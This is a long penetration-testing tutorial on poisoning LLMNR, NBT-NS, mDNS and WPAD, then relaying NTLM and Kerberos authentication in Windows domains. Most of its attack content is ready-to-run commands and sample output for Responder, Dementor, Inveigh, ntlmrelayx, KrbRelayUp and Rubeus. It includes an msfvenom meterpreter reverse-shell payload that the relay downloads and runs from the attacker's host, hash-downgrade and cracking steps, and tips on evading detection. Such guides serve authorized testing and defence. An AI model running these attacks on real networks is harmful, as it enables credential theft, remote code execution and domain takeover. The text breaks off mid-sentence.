# LLMNR / NBT-NS Poisoning



### Overview

**Protocol poisoning attacks** exploit unauthenticated broadcast name resolution protocols (LLMNR, NBT-NS, mDNS) to intercept and relay authentication attempts. When DNS fails to resolve a hostname, Windows systems fall back to these legacy protocols, broadcasting queries over the network. Attackers can respond to these broadcasts, impersonating legitimate services and capturing credentials or relaying authentication to gain unauthorized access.

**Key Concepts:**

* **Name Resolution Poisoning** - Responding to broadcast queries with malicious answers
* **NTLM Relay** - Forwarding captured authentication to target systems
* **Credential Harvesting** - Capturing NetNTLMv1/v2 hashes from authentication attempts
* **Service Impersonation** - Pretending to be legitimate network services (file shares, web services)

**Why this matters:** These protocols are enabled by default on Windows, broadcast in cleartext, require no authentication, and are trusted implicitly. This creates a perfect storm for man-in-the-middle attacks, allowing attackers to capture credentials or gain system access within minutes of connecting to a network.

**Vulnerable Protocols:**

* **LLMNR (5355/UDP)** - Link-Local Multicast Name Resolution (Windows)
* **NBT-NS (137/UDP)** - NetBIOS Name Service (Windows legacy)
* **mDNS (5353/UDP)** - Multicast DNS (Apple/Linux)
* **WPAD (HTTP/HTTPS)** - Web Proxy Auto-Discovery Protocol

**Common Attack Ports:**

* **445/TCP** - SMB (Primary relay target)
* **389/TCP** - LDAP (Directory modification target)
* **636/TCP** - LDAPS (Secure LDAP target)
* **80/443/TCP** - HTTP/HTTPS (Web services and WPAD)
* **8530/TCP** - WSUS HTTP (Windows Update poisoning)

***

### Exploitation Workflow Summary

1. Network Positioning ├─ Connect to target network segment ├─ Identify domain environment ├─ Verify layer 2 access └─ Check for SMB signing status
2. Poisoning Setup ├─ Start Responder or Dementor ├─ Configure protocol listeners ├─ Enable WPAD impersonation └─ Set up credential capture
3. Credential Capture ├─ Poison LLMNR/NBT-NS queries ├─ Impersonate requested services ├─ Capture NetNTLM hashes └─ Attempt hash cracking
4. Relay Attack (if applicable) ├─ Identify relay targets (SMB signing disabled) ├─ Configure ntlmrelayx ├─ Relay authentication to target └─ Execute commands or dump credentials
5. Advanced Exploitation ├─ LDAP relay for privilege escalation ├─ WSUS poisoning for machine accounts ├─ Kerberos relay for same-host attacks └─ WPAD poisoning for persistent access
6. Post-Exploitation ├─ Crack captured hashes ├─ Test credential validity ├─ Identify privileged accounts └─ Plan lateral movement

***

### Understanding Name Resolution Protocols

#### Name Resolution Fallback Chain

**Windows name resolution order:**

```
1. Local hosts file (C:\Windows\System32\drivers\etc\hosts)
2. DNS server query
3. LLMNR broadcast (if DNS fails)
4. NBT-NS broadcast (if LLMNR fails)
```

**Attack opportunity:** When DNS cannot resolve a name (typo, non-existent host, network issue), Windows broadcasts the query. Any system on the network can respond, including attackers.

#### LLMNR (Link-Local Multicast Name Resolution)

**What it is:** LLMNR is Microsoft's successor to NBT-NS, designed for name resolution on local networks without DNS servers.

**Technical details:**

* Port: 5355/UDP
* Multicast address: 224.0.0.252 (IPv4), FF02::1:3 (IPv6)
* Enabled by default on Windows Vista and later
* No authentication required
* Responds to name resolution queries

**Attack scenario:**

```
1. User types: \\FILESERVER01\share (typo in hostname)
2. DNS lookup fails (name doesn't exist)
3. Windows broadcasts LLMNR query: "Who is FILESERVER01?"
4. Attacker responds: "I am FILESERVER01 at 10.10.10.50"
5. User's system connects to attacker
6. Attacker captures NTLM authentication
```

#### NBT-NS (NetBIOS Name Service)

**What it is:** NBT-NS is a legacy Windows protocol for name resolution in NetBIOS networks.

**Technical details:**

* Port: 137/UDP
* Broadcast-based (entire subnet receives query)
* Predates LLMNR (Windows NT era)
* Still enabled by default on modern Windows
* Used for backward compatibility

**Why it's still dangerous:** Even in modern Active Directory environments, NBT-NS remains active and can be poisoned for credential capture.

#### mDNS (Multicast DNS)

**What it is:** mDNS is Apple's Bonjour protocol, also used by Linux systems for zero-configuration networking.

**Technical details:**

* Port: 5353/UDP
* Multicast address: 224.0.0.251 (IPv4), FF02::FB (IPv6)
* Used by macOS, iOS, and Linux by default
* Resolves .local domains

**Cross-platform impact:** While primarily targeting Windows, Responder/Dementor can also poison mDNS queries from macOS and Linux systems, capturing credentials from non-Windows devices.

#### WPAD (Web Proxy Auto-Discovery Protocol)

**What it is:** WPAD allows browsers to automatically discover proxy server configurations without manual setup.

**How WPAD discovery works:**

```
1. Browser checks DHCP option 252 for WPAD URL
2. If no DHCP response, queries DNS for wpad.domain.com
3. If DNS fails, falls back to LLMNR/NBT-NS for "WPAD"
4. Downloads and executes wpad.dat configuration file
```

**Attack opportunity:** By responding to WPAD queries, attackers can:

* Direct all web traffic through a malicious proxy
* Capture HTTP/HTTPS authentication
* Perform man-in-the-middle on web traffic
* Inject malicious content into web pages

***

### Responder: Protocol Poisoning Tool

#### Understanding Responder

**Responder** is the industry-standard tool for LLMNR/NBT-NS/mDNS poisoning and credential capture. It listens for broadcast name resolution queries and responds with malicious answers, capturing authentication attempts.

**What Responder does:**

* Poisons LLMNR, NBT-NS, and mDNS queries
* Impersonates SMB, HTTP, HTTPS, FTP, SQL, LDAP servers
* Captures NetNTLMv1/v2 challenge-response hashes
* Supports WPAD poisoning
* Works on both IPv4 and IPv6

**Default configuration location:**

* Kali Linux: `/etc/responder/Responder.conf`
* Captured hashes: `/usr/share/responder/logs/`

#### Basic Responder Usage

**Start with default settings:**

```bash
responder -I eth0
```

**Parameters:**

* `-I eth0` - Network interface to listen on

**What happens:**

```
[+] Listening for events...
[*] [LLMNR] Poisoned answer sent to 10.10.10.15 for name FILESERVER01
[SMB] NTLMv2-SSP Client   : 10.10.10.15
[SMB] NTLMv2-SSP Username : DOMAIN\jsmith
[SMB] NTLMv2-SSP Hash     : jsmith::DOMAIN:1122334455667788:A1B2C3D4...
```

**Expected behavior:**

* Listens for LLMNR/NBT-NS/mDNS queries
* Responds with attacker's IP address
* Captures authentication attempts
* Displays hashes on screen
* Saves hashes to log files

#### Aggressive Probing Mode

**Force authentication attempts:**

```bash
responder -I eth0 -P -r -v
```

**Parameters explained:**

* `-P` - Force NTLM authentication for HTTP
* `-r` - Force NTLM authentication for basic auth prompts
* `-v` - Verbose output (show all events)

**Warning:** Aggressive mode may cause:

* Network service disruptions
* Increased detection risk
* False authentication prompts to users
* More event log entries

**When to use aggressive mode:**

* Short-term penetration tests
* When stealth is not a priority
* Testing detection capabilities

#### Downgrade Attacks for Easier Cracking

**Capture NTLMv1 challenges (weaker than NTLMv2):**

```bash
responder -I eth0 --lm --disable-ess
```

**Parameters:**

* `--lm` - Force LM hashing (very weak, easily crackable)
* `--disable-ess` - Disable Extended Session Security

**Why this works:** NTLMv1 hashes are significantly weaker than NTLMv2:

* NTLMv1: Can be cracked in seconds using rainbow tables
* NTLMv1 without ESS: Even weaker, vulnerable to rainbow tables
* NTLMv2: Requires dictionary or brute force attacks

**Cracking NTLMv1 hashes:**

```bash
# Using hashcat with rainbow tables
hashcat -m 5500 ntlmv1_hash.txt /path/to/wordlist.txt

# NTLMv1 without ESS (rainbow table attack)
# Can be cracked online in seconds
```

**Ethical considerations:** Downgrade attacks actively weaken security. Only use with proper authorization during penetration tests.

#### WPAD Impersonation

**Enable WPAD poisoning:**

```bash
responder -I eth0 --wpad
```

**What happens:**

1. Responder answers WPAD queries with attacker's IP
2. Victim's browser requests `http://attacker-ip/wpad.dat`
3. Responder serves malicious WPAD configuration:

```javascript
function FindProxyForURL(url, host) {
    return "PROXY attacker-ip:3128";
}
```

4. All browser traffic routes through attacker
5. Captures HTTP authentication credentials

**Expected output:**

```
[+] Listening for WPAD queries...
[*] [LLMNR] Poisoned answer sent to 10.10.10.25 for name WPAD
[HTTP] Sending WPAD file to 10.10.10.25
[HTTP] NTLMv2 Hash captured from 10.10.10.25
```

#### NetBIOS Name Resolution Poisoning

**Resolve all NetBIOS requests to attacker IP:**

```bash
responder -I eth0 -Pv
```

**Use case:** When users mistype server names or access non-existent shares:

```
User types: \\FILESERVRE\docs (typo)
↓
DNS lookup fails
↓
NBT-NS broadcast: "Who is FILESERVRE?"
↓
Responder responds: "I am! (attacker IP)"
↓
User connects to attacker
↓
Credentials captured
```

***

### Dementor: Enhanced Protocol Poisoning

#### Understanding Dementor

**Dementor** is a modern alternative to Responder with enhanced capabilities and more granular configuration. It fixes several capture issues present in Responder and adds support for additional attack vectors.

**Key improvements over Responder:**

* More granular protocol configuration
* Fixes capture issues on certain protocols
* Supports CUPS RCE exploitation
* Better compatibility with modern systems
* Enhanced logging and analysis modes

**Default configuration:**

* Config file: `Dementor.toml`
* Compatible with Responder workflow
* Can be run alongside existing tools

#### Basic Dementor Usage

**Run with default settings:**

```bash
dementor -I eth0
```

**Analysis mode (passive observation):**

```bash
dementor -I eth0 -A
```

**Parameters:**

* `-I eth0` - Network interface
* `-A` - Analysis mode (don't respond, only observe)

**Analysis mode use case:** Before launching active attacks, use analysis mode to:

* Identify what protocols are in use
* See what services users are attempting to access
* Understand network behavior patterns
* Plan targeted attacks

#### Automatic Session Downgrade

**Force NTLMv1 captures:**

```bash
dementor -I eth0 -O NTLM.ExtendedSessionSecurity=Off
```

**Parameters:**

* `-O` - Option override
* `NTLM.ExtendedSessionSecurity=Off` - Disable ESS

**How it works:** Dementor manipulates the NTLM negotiation to force clients to use weaker authentication:

1. Client initiates NTLM authentication
2. Dementor intercepts negotiation
3. Modifies flags to disable ESS
4. Client falls back to weaker NTLMv1
5. Captured hash is easier to crack

#### Custom Configuration

**Run with custom config file:**

```bash
dementor -I eth0 --config custom.toml
```

**Example custom configuration:**

```toml
[NTLM]
ExtendedSessionSecurity = Off
Challenge = "1122334455667788"

[HTTP]
Enabled = true
Port = 80

[SMB]
Enabled = true
Port = 445

[WPAD]
Enabled = true
```

**Why use custom configs:**

* Target specific protocols only
* Reduce network noise
* Avoid detection signatures
* Customize attack parameters

***

### DHCP Poisoning with Responder

#### Understanding DHCP Poisoning

**DHCP poisoning** provides attacker IP as the gateway, DNS server, or WPAD server to victims renewing DHCP leases. This is more persistent than ARP poisoning but requires precise network knowledge.

**Advantages over ARP poisoning:**

* More persistent (survives system reboots)
* Less network traffic (only during DHCP renewal)
* Harder to detect with ARP monitoring tools
* Can poison multiple victims simultaneously

**Risks:**

* Can disrupt legitimate DHCP service
* May cause network connectivity issues
* Requires knowledge of DHCP server configuration
* More disruptive than passive poisoning

#### Running DHCP Poisoning

**Execute DHCP poisoning attack:**

```bash
./Responder.py -I eth0 -Pdv
```

**Parameters:**

* `-P` - Force NTLM authentication
* `-d` - Enable DHCP poisoning
* `-v` - Verbose output

**What gets poisoned:**

* DNS server IP → Attacker IP
* Default gateway → Attacker IP (optional)
* WPAD URL → Attacker-controlled URL

**Attack flow:**

```
1. Victim requests DHCP lease renewal
2. Responder responds faster than legitimate DHCP server
3. Victim accepts malicious DHCP offer
4. Victim uses attacker as DNS server
5. All DNS queries go through attacker
6. Attacker resolves names to attacker IP
7. Captures all authentication attempts
```

#### Required Network Information

**Before launching DHCP poisoning, gather:**

```bash
# Identify DHCP server
nmap -sU -p 67 --script dhcp-discover 10.10.10.0/24

# Current network configuration
ip addr show
ip route show
cat /etc/resolv.conf
```

**Information needed:**

* Subnet mask (e.g., 255.255.255.0)
* Default gateway IP
* DNS server IPs
* DHCP lease time
* IP range allocated by DHCP

**Configuration in Responder.conf:**

```ini
[DHCP]
DHCP = On
DHCP_DNS = 10.10.10.50  # Attacker IP
DHCP_DOMAIN = domain.local
DHCP_ROUTER = 10.10.10.1  # Real gateway
```

***

### Inveigh: Windows-Based Poisoning

#### Understanding Inveigh

**Inveigh** is a Windows-native alternative to Responder, designed for penetration testing from Windows systems. Useful when operating from compromised Windows hosts or when Linux tools aren't available.

**Available versions:**

* **Inveigh (PowerShell)** - Original PowerShell script
* **InveighZero (C#)** - Compiled binary version
* Both provide similar functionality

**Use cases:**

* Post-exploitation from compromised Windows host
* Red team operations on Windows infrastructure
* Situations where Linux tools can't be used
* When operating from Windows attack platform

#### PowerShell Version

**Run Inveigh from PowerShell:**

```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```

**Parameters explained:**

* `-NBNS Y` - Enable NBT-NS poisoning
* `-ConsoleOutput Y` - Display output to console
* `-FileOutput Y` - Save captures to file

**Expected output:**

```
[*] Inveigh 1.5 started at 2024-12-21 10:15:00
[+] LLMNR poisoning enabled
[+] NBT-NS poisoning enabled
[*] Listening on 10.10.10.50
[+] LLMNR request for FILESERVER01 from 10.10.10.15
[+] NBT-NS request for FILESERVER01 from 10.10.10.15
[+] NTLMv2 hash captured from DOMAIN\jsmith
```

**Output files:**

* Captured hashes: `Inveigh-Log.txt`
* Full logs: `Inveigh-Console.txt`
* NTLM hashes: `Inveigh-NTLMv2.txt`

#### C# Binary Version

**Execute compiled binary:**

```cmd
Inveigh.exe
```

**Advantages of binary version:**

* No PowerShell required (evades script logging)
* Harder to detect
* Can be obfuscated
* Single executable file
* Faster execution

**Basic execution:**

```cmd
# Default settings
Inveigh.exe

# With specific options
Inveigh.exe -LLMNR Y -NBNS Y -FileOutput Y
```

**Stealth considerations:**

```cmd
# Run without console output (quieter)
Inveigh.exe -ConsoleOutput N -FileOutput Y

# Output to specific directory
Inveigh.exe -FileOutputDirectory C:\Temp\logs
```

***

### NTLM Relay Attacks

#### Understanding NTLM Relay

**NTLM relay** forwards captured authentication to a target system without cracking passwords. If successful, the attacker gains access with the victim's privileges.

**How NTLM relay works:**

```
1. Victim attempts to authenticate to attacker
2. Attacker captures NTLM challenge-response
3. Instead of cracking, attacker relays auth to target
4. Target accepts authentication (if valid)
5. Attacker gains access as victim user
```

**Key difference from hash capture:**

* Hash capture → Requires offline cracking → Time-consuming
* NTLM relay → Immediate access → No cracking needed

#### Prerequisites for NTLM Relay

**Critical requirements:**

**1. Authenticating user must have privileges on target:**

```
Victim: DOMAIN\jsmith (Local Admin on TARGET01)
Target: TARGET01
Result: Relay succeeds, attacker gets admin access
```

**2. SMB signing must be disabled on target:**

```bash
# Check SMB signing status
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# Output shows signing status
SMB  10.10.10.15  445  TARGET01  [*] Windows 10 Build 19041 (signing: False)
SMB  10.10.10.20  445  TARGET02  [*] Windows 10 Build 19041 (signing: True)
```

**Why SMB signing matters:**

* Signing disabled → Relay works
* Signing enabled → Relay fails (signature doesn't match)

**Identifying relay targets:**

```bash
# Find systems without SMB signing
nmap --script smb2-security-mode -p445 10.10.10.0/24 | grep "disabled"

# Using NetExec (CrackMapExec)
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt
```

#### Basic NTLM Relay with ntlmrelayx

**Setup relay to SMB target:**

```bash
ntlmrelayx.py -t smb://10.10.10.20 -smb2support
```

**Parameters:**

* `-t smb://10.10.10.20` - Relay target (IP or hostname)
* `-smb2support` - Enable SMB2/SMB3 protocol support

**Attack flow:**

```
1. Start ntlmrelayx (listening on port 445)
2. Start Responder (to poison and redirect traffic)
   responder -I eth0 -v
3. Wait for authentication attempts
4. ntlmrelayx relays auth to target
5. Dumps SAM hashes if successful
```

**Expected output:**

```
[*] Servers started, waiting for connections
[*] HTTPD: Received connection from 10.10.10.15
[*] HTTPD: Authenticating against smb://10.10.10.20
[*] SMBD: Received connection from 10.10.10.15
[+] Relay successful to smb://10.10.10.20
[*] Dumping SAM hashes...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

#### Interactive Shell via Relay

**Get interactive SMB shell:**

```bash
ntlmrelayx.py -t smb://10.10.10.20 -smb2support -i
```

**Parameters:**

* `-i` - Interactive mode (start SOCKS proxy)

**Expected output:**

```
[+] Relay successful!
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

**Connect to interactive shell:**

```bash
nc 127.0.0.1 11000
```

**Available commands:**

```
# Use like normal SMB client
shares
use C$
ls
cat important.txt
```

#### Command Execution via Relay

**Execute command on successful relay:**

```bash
ntlmrelayx.py -t smb://10.10.10.20 -smb2support -c "whoami"
```

**Parameters:**

* `-c "whoami"` - Command to execute

**Execute multiple commands:**

```bash
ntlmrelayx.py -t smb://10.10.10.20 -smb2support -c "whoami && ipconfig && net user"
```

**Deploy backdoor or reverse shell:**

```bash
# Create payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.50 LPORT=4444 -f exe > backdoor.exe

# Host payload
python3 -m http.server 8000

# Relay and download payload
ntlmrelayx.py -t smb://10.10.10.20 -smb2support -c "powershell iwr http://10.10.10.50:8000/backdoor.exe -o C:\temp\backdoor.exe; C:\temp\backdoor.exe"
```

#### SOCKS Proxy Mode

**Create SOCKS proxy for multiple relays:**

```bash
ntlmrelayx.py -tf targets.txt -smb2support -socks
```

**Parameters:**

* `-tf targets.txt` - File containing multiple targets
* `-socks` - Start SOCKS server for proxying

**Expected output:**

```
[*] SOCKS proxy started on port 1080
[*] Servers started, waiting for connections
[+] Relay successful to smb://10.10.10.20
[*] Adding connection to SOCKS proxy
[+] Relay successful to smb://10.10.10.25
[*] Adding connection to SOCKS proxy
```

**Use relayed sessions:**

```bash
# Configure proxychains
echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf

# Use any tool through relayed sessions
proxychains smbclient -L //10.10.10.20 -N
proxychains secretsdump.py DOMAIN/user@10.10.10.20 -no-pass
```

**List active sessions:**

```bash
# In ntlmrelayx interactive mode
ntlmrelayx> socks
Protocol  Target         Username          AdminStatus  Port
--------  -------------  ----------------  -----------  ----
SMB       10.10.10.20    DOMAIN\jsmith     TRUE         445
SMB       10.10.10.25    DOMAIN\adavis     FALSE        445
```

***

### Advanced Relay Techniques

#### Port 445 Forwarding for Relay

**Problem:** Direct network access to port 445 may not be available from attacker position.

**Solution:** Use PortBender to redirect traffic through compromised host.

**PortBender setup (Cobalt Strike):**

```
1. Load PortBender.cna script
Cobalt Strike → Script Manager → Load → Select PortBender.cna

2. Upload WinDivert driver
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\PortBender\WinDivert64.sys

3. Redirect port 445 to 8445
beacon> PortBender redirect 445 8445

4. Forward to Team Server
beacon> rportfwd 8445 127.0.0.1 445

5. Create SOCKS proxy
beacon> socks 1080
```

**How it works:**

```
Target → 445/TCP → Compromised Host → 8445/TCP → Team Server → 445/TCP → ntlmrelayx
```

**Cleanup commands:**

```
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```

#### Relay to LDAP for Privilege Escalation

**LDAP relay enables powerful AD attacks:**

```bash
ntlmrelayx.py -t ldap://dc01.domain.local -smb2support --escalate-user normaluser
```

**What this does:**

1. Relays authentication to LDAP
2. Modifies AD objects via LDAP
3. Grants privileges to specified user
4. Can add user to Domain Admins

**Resource-Based Constrained Delegation (RBCD) attack:**

```bash
ntlmrelayx.py -t ldaps://dc01.domain.local -smb2support --delegate-access
```

**Attack flow:**

```
1. Capture machine account authentication
2. Relay to LDAPS (requires LDAPS, not LDAP)
3. Create computer account or use existing
4. Modify msDS-AllowedToActOnBehalfOfOtherIdentity
5. Impersonate any user to target machine
6. Gain SYSTEM access
```

#### MultiRelay Tool

**MultiRelay** is part of the Responder suite, designed for targeted relay attacks.

**Location:**

```bash
cd /usr/share/responder/tools
```

**Relay all users to target:**

```bash
python MultiRelay.py -t 10.10.10.20 -u ALL
```

**Execute command on successful relay:**

```bash
python MultiRelay.py -t 10.10.10.20 -u ALL -c whoami
```

**Dump hashes from target:**

```bash
python MultiRelay.py -t 10.10.10.20 -u ALL -d
```

**Parameters:**

* `-t 10.10.10.20` - Target IP address
* `-u ALL` - Relay all captured users
* `-u DOMAIN\user` - Relay specific user only
* `-c command` - Execute command
* `-d` - Dump SAM/LSA secrets

**Using with proxychains:**

```bash
# Route through SOCKS proxy
proxychains python MultiRelay.py -t 10.10.10.20 -u ALL -d
```

***

### WSUS HTTP Relay Attack

#### Understanding WSUS NTLM Relay

**Windows Server Update Services (WSUS)** clients authenticate to update servers using NTLM over HTTP (port 8530). This creates relay opportunities that blend into normal update traffic and frequently yield machine account credentials.

**Why WSUS relay is powerful:**

* Machine accounts authenticate (HOST$ credentials)
* Periodic automatic check-ins (every few hours)
* Blends into legitimate update traffic
* Can relay to LDAP, AD CS, or SMB
* HTTP makes relay easier (no SMB signing)

**Vulnerable configuration:**

* WSUS configured to use HTTP (port 8530)
* Not HTTPS (port 8531)
* Common in enterprise environments
* Often overlooked security gap

#### WSUS Reconnaissance

**Unauthenticated scanning:**

```bash
# Scan for WSUS listeners
nmap -sSVC -Pn --open -p 8530,8531 -iL targets.txt
```

**Expected output:**

```
PORT     STATE SERVICE
8530/tcp open  http    Microsoft HTTPAPI httpd 2.0 (WSUS)
```

**Authenticated enumeration via SYSVOL:**

```bash
# Check Group Policy for WSUS settings
# Look for: HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate

# Using NetExec
nxc smb dc01.domain.local -u user -p pass -M reg-query -o PATH="HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" KEY="WUServer"
```

**Expected registry values:**

```
WUServer: http://wsus.domain.local:8530
WUStatusServer: http://wsus.domain.local:8530
UseWUServer: 1 (WSUS enabled)
DetectionFrequency: 4 (check every 4 hours)
```

**WSUS SOAP endpoints (authentication happens here):**

```
/ClientWebService/client.asmx (update approvals)
/ReportingWebService/reportingwebservice.asmx (status reporting)
```

#### Executing WSUS Relay Attack

**Step 1: Position for Man-in-the-Middle**

```bash
# ARP poisoning to intercept WSUS traffic
arpspoof -i eth0 -t 10.10.10.15 10.10.10.5
# 10.10.10.15 = WSUS client
# 10.10.10.5 = WSUS server
```

**Step 2: Redirect port 8530 to relay**

```bash
# Redirect incoming WSUS traffic to ntlmrelayx
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530

# Verify rule
iptables -t nat -L PREROUTING --line-numbers
```

**Step 3: Start ntlmrelayx with HTTP listener**

```bash
# Relay to LDAP for privilege escalation
ntlmrelayx.py -t ldap://dc01.domain.local -smb2support -socks --http-port 8530

# Relay to AD CS for certificate issuance
ntlmrelayx.py --http-port 8530 -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template Machine
```

**Parameters:**

* `--http-port 8530` - Listen on WSUS port
* `-t ldap://` - Relay target (LDAP for RBCD)
* `--adcs` - AD CS certificate request mode
* `--template Machine` - Request machine certificate template

**Step 4: Trigger client check-in**

```cmd
# From client system
wuauclt.exe /detectnow

# Or wait for automatic check-in (every few hours)
```

**Expected output:**

```
[*] Servers started, waiting for connections
[*] HTTPD: Received connection from 10.10.10.15
[*] HTTPD: Authenticating against ldap://dc01.domain.local
[+] DOMAIN\WORKSTATION01$: Successfully authenticated via LDAP
[*] Enumerating relayed user's privileges
[*] Attempting RBCD attack...
[+] Success! WORKSTATION01$ can now impersonate any user to WORKSTATION01
```

**What you gain:**

* Machine account authentication (high privileges)
* Can perform RBCD attack
* Or request machine certificate from AD CS
* Blend into normal WSUS traffic

#### WSUS Relay to AD CS (ESC8)

**Request machine certificate via relay:**

```bash
ntlmrelayx.py --http-port 8530 -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template Machine --no-http-server
```

**Attack flow:**

```
1. Intercept WSUS HTTP authentication (machine account)
2. Relay to AD CS web enrollment endpoint
3. Request machine certificate using relayed auth
4. Receive signed certificate
5. Use certificate for PKINIT authentication
6. Obtain TGT for machine account
7. Perform S4U2Self to impersonate users
8. Gain SYSTEM on target machine
```

**Using the certificate:**

```bash
# Convert certificate for use with Rubeus
certipy auth -pfx workstation01.pfx -dc-ip 10.10.10.5

# Obtain TGT
Rubeus.exe asktgt /user:WORKSTATION01$ /certificate:workstation01.pfx /nowrap

# Impersonate administrator
Rubeus.exe s4u /ticket:BASE64_TGT /impersonateuser:Administrator /msdsspn:cifs/workstation01.domain.local /ptt
```

#### HTTPS vs HTTP WSUS

**HTTPS (port 8531) limitations:**

* Cannot intercept without trusted certificate
* SSL/TLS encryption prevents relay
* Much more secure configuration
* Becoming more common

**HTTP (port 8530) vulnerability:**

* Cleartext NTLM authentication
* Easy to intercept and relay
* Still common in many environments
* Microsoft has deprecated WSUS but it's still widely deployed

**Identifying which is used:**

```bash
# Check registry on client
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

# Look for:
WUServer REG_SZ http://wsus.domain.local:8530  (vulnerable)
WUServer REG_SZ https://wsus.domain.local:8531 (not vulnerable to this attack)
```

***

### Kerberos Relay Attack

#### Understanding Kerberos Relay

**Kerberos relay** is conceptually different from NTLM relay. Instead of relaying challenge-response authentication, it steals a Kerberos service ticket (AP-REQ) intended for one service and reuses it against a different service on the **same machine**.

**Critical difference from NTLM relay:**

* NTLM relay: Can relay to any machine (if SMB signing off)
* Kerberos relay: Limited to **same host** different services

**Why Kerberos relay works:**

```
Service tickets are encrypted with the machine account's key.
Two SPNs on the same machine (e.g., CIFS/HOST and LDAP/HOST) 
share the same encryption key (machine's NT hash).
The SPN string is NOT part of the ticket's signature.
Windows doesn't validate that the SPN in the ticket matches the service.

Therefore: Ticket for CIFS/DC01 → Can be used for LDAP/DC01
```

#### Kerberos Relay Prerequisites

**1. Shared account key:**

```bash
# Find servers where multiple services share same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName | 
  Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} | 
  Select Name,servicePrincipalName
```

**Example output:**

```
Name    servicePrincipalName
----    --------------------
DC01    {LDAP/DC01, LDAP/DC01.domain.local, CIFS/DC01, CIFS/DC01.domain.local, HTTP/DC01}
```

**2. No channel protection:**

* SMB signing: OFF
* LDAP signing: OFF
* EPA (Extended Protection for Authentication): OFF

**3. Interception capability:**

* LLMNR/NBT-NS poisoning
* DNS spoofing (requires DNSAdmins or similar)
* Man-in-the-middle position
* Coercion techniques (PetitPotam, DFSCoerce)

**4. Race condition win:**

* Relay ticket before legitimate packet arrives
* Or block legitimate packet entirely
* Otherwise server's replay cache rejects (Event 4649)

#### Kerberos Relay Attack Workflow

**Step 1: Identify target with shared SPNs**

```powershell
# PowerShell enumeration
Get-ADComputer -Filter * -Properties servicePrincipalName | 
  Where-Object {$_.servicePrincipalName -match 'LDAP' -and $_.servicePrincipalName -match 'CIFS'}
```

**Step 2: Start KrbRelayUp (automated tool)**

```cmd
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```

**Parameters:**

* `--spn "ldap/DC01.lab.local"` - Target LDAP service on DC
* `--method rbcd` - Use Resource-Based Constrained Delegation
* `--clsid` - COM object CLSID for coercion

**What KrbRelayUp does automatically:**

1. Coerces authentication via COM trigger
2. Intercepts Kerberos AP-REQ for CIFS/DC01
3. Relays ticket to LDAP/DC01
4. Configures RBCD on machine account
5. Impersonates Administrator
6. Obtains SYSTEM shell

**Step 3: Coerce authentication (if manual)**

```cmd
# Using DFSCoerce to force DC to authenticate
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```

**What happens:**

```
1. DFSCoerce triggers RPC call to DC01
2. DC01 attempts to authenticate to 10.0.0.50 (attacker)
3. DC01 sends Kerberos ticket for CIFS/10.0.0.50
4. Attacker captures AP-REQ containing service ticket
```

**Step 4: Relay captured ticket**

```cmd
# KrbRelay extracts AP-REQ and relays to LDAP
# (automatic in KrbRelayUp, manual with KrbRelay.exe)

KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
```

**Step 5: Exploit RBCD for privilege escalation**

```powershell
# Create fake computer account
New-MachineAccount -Name "FAKE01" -Password "P@ss123"

# Get SID of fake computer
$sid = Get-ADComputer FAKE01 -Properties objectSID | Select -ExpandProperty objectSID

# Use Rubeus to impersonate Administrator
Rubeus.exe s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:HOST/DC01 /ptt

# Bypass UAC and get SYSTEM
SCMUACBypass.exe
```

#### Additional Kerberos Relay Vectors

**AuthIP / IPSec coercion:**

```
Fake AuthIP server sends GSS-ID payload with arbitrary SPN.
Client builds AP-REQ and sends directly to attacker.
Works across subnets (doesn't require L2 access).
Captures machine credentials by default.
```

**DCOM / MSRPC coercion:**

```
Malicious OXID resolver forces client to authenticate.
Can specify arbitrary SPN and port.
Pure local privilege escalation technique.
Sidesteps firewall restrictions.
```

**AD CS Web Enrollment relay:**

```
Relay machine ticket to HTTP/CA endpoint.
Request machine certificate from AD CS.
Use certificate for PKINIT authentication.
Mint TGTs for persistent access.
Bypasses LDAP signing defenses.
```

**Shadow Credentials attack:**

```
Relay to LDAP and write msDS-KeyCredentialLink.
Add attacker-controlled public key to target object.
Use PKINIT with forged key pair.
No need to create computer account.
```

***

### Forced Authentication Techniques

#### Understanding Forced Authentication

**Forced authentication** techniques coerce Windows systems to authenticate to attacker-controlled servers, even without user interaction. Combined with poisoning/relay, these techniques guarantee credential capture.

**Common coercion methods:**

* File share access (UNC paths)
* Printer bugs (MS-RPRN)
* PetitPotam (EfsRpcOpenFileRaw)
* DFSCoerce (DFS-R RPC)
* PrinterBug (RpcRemoteFindFirstPrinterChangeNotification)

**See related topic:** \[\[Force NTLM Privileged Authentication]]

**Example coercion:**

```bash
# PetitPotam - Force DC to authenticate
python3 PetitPotam.py -d domain.local -u user -p password ATTACKER_IP DC_IP

# Start Responder to capture
responder -I eth0

# Or relay to target
ntlmrelayx.py -t ldaps://dc01.domain.local --escalate-user user
```

***

### Troubleshooting

#### Error: "KRB\_AP\_ERR\_MODIFIED"

**Problem:** Kerberos relay failed with modified ticket error

```
KRB_AP_ERR_MODIFIED: Ticket decryption failed
```

**Cause:** Ticket encrypted with different key than target service

**Solution:**

```
Verify source and target SPNs are on same machine:
- CIFS/DC01 → LDAP/DC01 ✓ (same host)
- CIFS/DC01 → LDAP/DC02 ✗ (different hosts)

Check that both services use machine account:
